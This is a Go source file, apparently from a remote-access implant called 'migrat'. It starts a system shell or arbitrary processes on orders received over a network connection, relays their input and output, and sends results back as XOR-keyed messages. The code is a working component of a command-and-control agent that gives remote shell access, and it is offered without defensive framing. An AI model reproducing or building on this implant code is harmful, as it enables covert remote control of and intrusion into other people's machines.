package module

import (
	"bufio"
	"io"
	"log"
	"migrat/constants"
	"migrat/contact"
	"net"
	"strings"
	"sync"
)

type Module struct {
	finished chan bool
	name     string
	external bool
	args     []string
	in       chan string
	out      chan string
	err      chan string
}

func Module_start(startMessage *contact.ModuleStart) (*Module, error) {
	switch startMessage.Type {
	case contact.ModuleStart_MODULE_SYSTEMSHELL:
		module, err := process_start(startMessage.Name, constants.SYSTEMSHELL, []string{})
		return module, err
	case contact.ModuleStart_MODULE_PROCESS:
		module, err := process_start(startMessage.Name, string(startMessage.Data), startMessage.Args)
		return module, err
	case contact.ModuleStart_MODULE_WASM:
		panic("not implemented")
	}
	panic("unreachable")
}

func (m *Module) In(data string) {
	m.in <- data
}

func Loop_modules(modules map[string]*Module, lock *sync.RWMutex, conn net.Conn, xorkey []byte, abort chan bool) {
	for {

		// lock modules map for writing, we might delete a key
		lock.Lock()
		// Reap dead Modules
		for modname, mod := range modules {
			select {
			case <-mod.finished:
				log.Println("loop_modules --> Module finished: ", modname)
				delete(modules, modname)
				// get module names
				var module_names []string
				for name := range modules {
					module_names = append(module_names, name)
				}
				err := contact.SendMessage(conn, &contact.ModuleList{Modules: module_names}, xorkey)
				if err != nil {
					log.Println("loop_modules --> ERROR sending message: ", err.Error())

				}
			default:
			}
		}
		lock.Unlock()

		// lock modules map for reading, we only access module pointers
		lock.RLock()
		// read modules
		for modname, mod := range modules {
			select {
			case msg := <-mod.out:
				log.Println("loop_modules --> Sending message from module ", modname)
				err := contact.SendMessage(conn, &contact.ModuleOutput{Name: modname, Output: msg}, xorkey)
				if err != nil {
					log.Println("loop_modules --> ERROR sending message: ", err.Error())

				}
			default:
			}
		}
		lock.RUnlock()

		// check if we should abort
		select {
		case <-abort:
			log.Println("loop_modules --> Aborting")
			return
		default:
		}
	}
}

func readPipe(pipe io.ReadCloser, out chan string) {
	reader := bufio.NewReader(pipe)
	for {

		output, err := reader.ReadString('\n')
		if err != nil {
			log.Println("readPipe --> Error reading shell: ", err.Error())
			break
		}
		log.Println("readPipe --> got output: ", output)

		out <- strings.Trim(strings.Trim(output, "\n"), "\r")
	}
}

func writePipe(pipe io.WriteCloser, in chan string) {
	for {
		input := <-in
		log.Println("writePipe --> got input: ", input)
		_, err := pipe.Write([]byte(input + "\n"))
		if err != nil {
			log.Println("writePipe --> Error writing to shell: ", err.Error())
		}
	}
}
